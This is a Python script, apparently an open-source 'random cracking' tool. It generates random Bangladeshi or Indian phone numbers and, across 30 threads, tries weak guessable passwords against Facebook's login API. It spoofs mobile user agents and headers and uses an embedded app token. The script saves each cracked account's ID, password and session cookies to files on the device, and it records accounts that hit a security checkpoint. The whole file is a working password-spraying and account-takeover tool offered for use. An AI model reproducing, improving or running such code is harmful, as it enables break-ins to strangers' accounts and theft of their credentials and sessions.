#-----------------------[ INFO-CODE ]-----------------------#
"""Open By   : Tanim Hossain [BHOOT-CYBER]
Developer : Tanim Hossain
Github    : Bhoot-Cyber-143
Status    : Open Source"""
#-----------------------[ IMPORT-CODE ]-----------------------#
import os
import sys
import marshal, base64, zlib
from os import path
import os,base64,zlib,pip,urllib
try:
        os.system('clear')
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system('pip install requests futures==2 > /dev/null')
except:pass
#-----------------------[ COLOR-CODE ]-----------------------#
a='\x1b[38;5;118m';b='\x1b[38;5;119m';c='\x1b[38;5;120m';d='\x1b[38;5;121m';e='\x1b[38;5;122m';g='\x1b[38;5;46m';r='\x1b[38;5;196m';w='\033[1;37m'
#-----------------------[ HEXXX-CODE ]-----------------------#
user=[];ok=[];cp=[];twf=[];cpx=[];cokix=[];plist=[];loop=0
#-----------------------[ SC-CODE ]-----------------------#
main_x = '(1) Bd Random \n (2) India random \n (3) Exit menu';bd_x = '017 | 018 | 019';ind_x = '+91639 | +91600 | +91620';line_x = '==================================================';cp_x = 'Do You Went Show Cp Ids (Y|N)';coki_x = 'Do You Went Show Cookies (Y|N)';c = 'Choice'
#-----------------------[ LOGO-CODE ]-----------------------#
logo = f""" SUMON """
#-----------------------[ CLEAR-CODE ]-----------------------#
def fresh():os.system('clear');print(logo)
#-----------------------[ LINE-CODE ]-----------------------#
def line():print(f'{line_x}')
#-----------------------[ MAIN-CODE ]-----------------------#
def Main():
    fresh();print(f' (1) Random Cracking \n (2) Help Senter \n (3) Exit Manu ');line()
    manu = input(f' (+) {c} : ')
    if manu in ['1','01']:country()
    elif manu in ['2','02']:os.system('xdg-open https://www.facebook.com/cyber.king.tanim');Main()
    else:Main()
#-----------------------[ COUNTRY-CODE ]-----------------------#
def country():
    fresh();print(f' {main_x} ');line()
    con_ck = input(f' (+) {c} : ')
    if con_ck in ['1','01']:rndm_bd()
    elif con_ck in ['2','02']:rndm_ind()
    else:Main()
#-----------------------[ RNDM-CODE-BD ]-----------------------#
def rndm_bd():
        fresh();print(f' (+) Example : {bd_x} ');line();code = input(f' (+) Find Sim Code : ')
        fresh();print(f' (+) Example : 1000 | 2000 | 5000 ');line();limit = int(input(f' (+) Find Limit : '))
        fresh();print(f' (+) {cp_x} ');line();cpy = input(f' (+) {c} (Y|N) : ')
        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
        else:cpx.append(f'y')
        fresh();print(f' (+) {coki_x} ');line();cokiy = input(f' (+) {c} (Y|N) : ')
        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
        else:cokix.append(f'y')
        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(Bhootxx)
        with tred(max_workers=30) as Tanim:
                tl = str(len(user))
                fresh();print(f' (+) Sim Code    : {code} \n (+) Total Limit : {limit} \n (+) Use Flight Mode Every 5 Minutes...');line()
                for love in user:
                        ids = code + love 
                        pasx = [love,ids,ids[:8],ids[:7],'@@@###','aabbcc','aaabbb','১২৩৪৫৬','১২৩৪৫৬৭৮','102030','405060','708090']
                        Tanim.submit(rndmx,ids,pasx,tl)
#-----------------------[ RNDM-CODE-INDIA ]-----------------------#
def rndm_ind():
        fresh();print(f' (+) Example : {ind_x}  ');line();code = input(f' (+) Find Sim Code : ')
        fresh();print(f' (+) Example : 1000 | 2000 | 5000 ');line();limit = int(input(f' (+) Find Limit : '))
        fresh();print(f' (+) {cp_x} ');line();cpy = input(f' (+) {c} (Y|N) : ')
        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
        else:cpx.append(f'y')
        fresh();print(f' (+) {coki_x} ');line();cokiy = input(f' (+) {c} (Y|N) : ')
        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
        else:cokix.append(f'y')
        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(6));user.append(Bhootxx)
        with tred(max_workers=30) as Tanim:
                tl = str(len(user))
                fresh();print(f' (+) Sim Code    : {code} \n (+) Total Limit : {limit} \n (+) Use Flight Mode Every 5 Minutes...');line()
                for love in user:
                        ids = code + love 
                        pasx = [ids[:6],ids[:8],ids,'57273200','57575751','59039200','57575752']
                        Tanim.submit(rndmx,ids,pasx,tl)
#-----------------------[ RANDOM-METHOD-CODE ]-----------------------#      
def rndmx(ids,pasx,tl):
        global loop,ok
        sys.stdout.write(f'\r{w} (Finding) ({loop}) ({str(ids)}) ({len(ok)}|{len(cp)})');sys.stdout.flush()
        try:
                for pas in pasx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        uaddx = [ "FBAN/FB4A;FBAV/349.0.0.0.113;FBAV/92.0.0.5943;FBBV/7381398;FBAN/FB4A;FBAV/320.0.0.0.84;FBAV/92.0.0.5943;FBBV/7381398;FBDM/{density=1.0,width=320,height=480};FBLC/tr_TR;FBRV/440700434;FBCR/Twigby;FBMF/OPPO;FBBD/Google Pixel Stand;com.facebook.lite;FBDV/Microsoft RM-1077;FBSV/79;FBOP/21;FBAN/FB4A;FBAV/23.0.0.9671;FBBV/2342045;FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBDM/{density=1.75,width=720,height=1515};FBLC/en_US;FBRV/541211947;","FBAN/FB4A;FBAV/309.0.0.0.73;FBAV/12.0.0.5569;FBBV/8058783;FBAN/FB4A;FBAV/333.0.0.0.97;FBAV/12.0.0.5569;FBBV/8058783;FBDM/{density=1.0,width=414,height=896};FBLC/ts_ZA;FBRV/448983014;FBCR/Xfinity Mobile;FBMF/Google Stadia;FBBD/Google Assistant (2018);com.facebook.intern.dev;FBDV/OnePlus IN2015;FBSV/18;FBOP/48;FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBRV/537275962;","FBAN/FB4A;FBAV/320.0.0.0.84;FBAV/30.0.0.2081;FBBV/6256905;FBAN/FB4A;FBAV/339.0.0.0.103;FBAV/30.0.0.2081;FBBV/6256905;FBDM/{density=1.0,width=414,height=896};FBLC/sr_RS;FBRV/312514289;FBCR/Google Fi;FBMF/Alcatel;FBBD/Google Home;com.facebook.feed;FBDV/Google Nest Hub;FBSV/70;FBOP/34;FBCA/arm64-v8a;FBMF/Motorola;FBBD/Moto G Stylus 5G;FBSV/11;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile","FBAN/FB4A;FBAV/329.0.0.0.93;FBAV/70.0.0.2321;FBBV/4151313;FBAN/FB4A;FBAV/311.0.0.0.75;FBAV/70.0.0.2321;FBBV/4151313;FBDM/{density=1.0,width=320,height=568};FBLC/wo_SN;FBRV/395097061;FBCR/Visible;FBMF/Google Assistant (2075);FBBD/Google Assistant (2023);com.facebook.gameroom;FBDV/Google Pixel Slate;FBSV/75;FBOP/140;FBCA/arm64-v8a;FBMF/Realme;FBBD/Realme GT 2 Pro;FBSV/12;FBDM/{density=3.0,width=1440,height=3200};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile"]
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': uaddx, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                print(f'\r{g} (Running) {str(uid)} | {pas} ')
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                if 'y' in cokix:print(f'\r{g} (Kid) : {coki} ')
                                open('/sdcard/BHOOT-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                ok.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                if 'y' in cpx:print(f'\r{r} (Fucking) {str(uid)} | {pas} ')
                                open('/sdcard/BHOOT-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass                        
#-----------------------[ END-CODE ]-----------------------#
Main()
